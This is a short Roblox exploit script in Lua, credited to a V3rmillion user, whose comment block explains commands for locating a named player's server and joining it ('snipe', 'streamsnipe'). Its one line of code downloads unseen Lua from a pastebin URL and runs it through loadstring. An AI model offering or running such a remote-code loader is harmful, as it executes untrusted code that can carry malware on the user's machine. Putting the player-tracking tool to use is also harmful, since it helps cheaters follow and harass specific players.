--[[

Credits to Aidez on V3rmillion

To use the script, you have to make use of a command. Which can be used in a few different ways
:join FULLPLAYERNAME PLACEID (Checks the place ID for the player, then joins you if there's a matching server)
:join USERID PLACEID (Does the same thing as the first one)
:join USERID (Checks the game you're in for the player, and joins if they're in it)
:join FULLPLAYERNAME (Does the same thing as the command above this one)

Join can also be replaced with "snipe", "streamsnipe", and "joingame"
You can also put /e at the start of the command to do it silently

--]]
loadstring(game:HttpGet(('https://pastebin.com/raw/sT56AM8k'),true))()
